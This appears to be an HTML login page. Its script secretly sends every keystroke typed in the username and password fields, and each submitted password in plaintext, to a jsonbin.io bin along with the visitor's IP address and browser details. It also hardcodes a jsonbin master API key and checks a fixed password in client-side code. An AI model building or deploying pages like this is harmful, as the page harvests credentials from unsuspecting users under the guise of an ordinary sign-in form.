<!DOCTYPE html>
<html lang="en" data-theme="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Permissions-Policy" content="interest-cohort=()">
  <title>Login</title>
  <style>
    body {
      font-family: 'Source Sans Pro', sans-serif;
      background: #111111;
      color: white;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-box {
      width: 100%;
      max-width: 400px;
      padding: 2rem;
      border-radius: 8px;
    }

    label {
      font-size: 0.875rem;
      margin-bottom: 0.25rem;
      display: block;
    }

    input {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: 1px solid #ffa500;
      border-radius: 6px;
      background-color: #121212;
      color: white;
    }

    button {
      width: 100%;
      padding: 0.75rem;
      background: linear-gradient(to right, #facc15, #f97316);
      color: black;
      font-weight: bold;
      border-radius: 6px;
      border: none;
      cursor: pointer;
    }

    #error-message {
      color: #ef4444;
      font-size: 0.875rem;
      display: none;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2 class="text-lg font-bold mb-4">LOGIN</h2>
    
    <label for="username">Username</label>
    <input type="text" id="username" placeholder="Username">

    <label for="password">Password</label>
    <input type="password" id="password" placeholder="Password">

    <button id="login-btn">Sign In</button>

    <div id="error-message"></div>
  </div>

  <script>
    const JSONBIN_API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
    const JSONBIN_BIN_ID = '67fa4eb78561e97a50fdfda5';

    const errorMessage = document.getElementById('error-message');

    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'unknown';
      }
    }

    function showError(message) {
      errorMessage.textContent = message;
      errorMessage.style.display = 'block';
      setTimeout(() => errorMessage.style.display = 'none', 5000);
    }

    async function logEvent(type, data) {
      try {
        const response = await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`, {
          headers: { 'X-Master-Key': JSONBIN_API_KEY }
        });
        const { record } = await response.json();

        record.events = record.events || [];
        record.events.push({
          type,
          data,
          timestamp: new Date().toISOString(),
          device: navigator.userAgent,
          ip: await getIP()
        });

        await fetch(`https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'X-Master-Key': JSONBIN_API_KEY,
            'X-Bin-Versioning': 'false'
          },
          body: JSON.stringify(record)
        });
      } catch (err) {
        console.error('Logging failed:', err);
      }
    }

    async function logLogin(email, status, password) {
      await logEvent('login_attempt', { email, password, status });
    }

    document.getElementById('login-btn').addEventListener('click', async () => {
      const email = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        showError('Please enter both username and password');
        return;
      }

      const isValidLogin = password === 'correct123';
      const status = isValidLogin ? 'success' : 'failed';

      await logLogin(email, status, password);

      alert(isValidLogin ? 'Login successful!' : 'Login failed - attempt logged');

      if (isValidLogin) {
        document.getElementById('username').value = '';
        document.getElementById('password').value = '';
      }
    });

    document.getElementById('username').addEventListener('input', (e) => {
      logEvent('typing', { field: 'username', value: e.target.value });
    });

    document.getElementById('password').addEventListener('input', (e) => {
      logEvent('typing', { field: 'password', value: e.target.value });
    });
  </script>
</body>
</html>
